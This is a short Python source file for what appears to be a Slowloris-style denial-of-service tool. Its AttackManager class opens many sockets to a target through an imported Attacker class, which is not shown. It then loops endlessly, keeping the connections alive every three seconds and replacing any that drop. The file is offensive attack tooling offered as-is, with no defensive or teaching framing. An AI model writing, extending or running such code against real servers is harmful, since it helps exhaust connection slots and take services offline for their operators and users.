import time

from Attacker import Attacker


class AttackManager:
    def __init__(self, target, numSockets):
        self.target = target

        self.socketCount = numSockets

        self.socketList = []

    # Procede with an attack
    def attack(self):

        self.createAttackers()
        while (True):

            for loris in self.socketList:
                try:
                    loris.attackTarget()

                except Exception as e:

                    self.socketList.remove(loris)

                    newLoris = Attacker(self.target)

                    newLoris.createSocket()

                    self.socketList.append(newLoris)

            time.sleep(3)




    def createAttackers(self):
        for i in range(self.socketCount):

            socket = Attacker(self.target)

            socket.createSocket()

            self.socketList.append(socket)
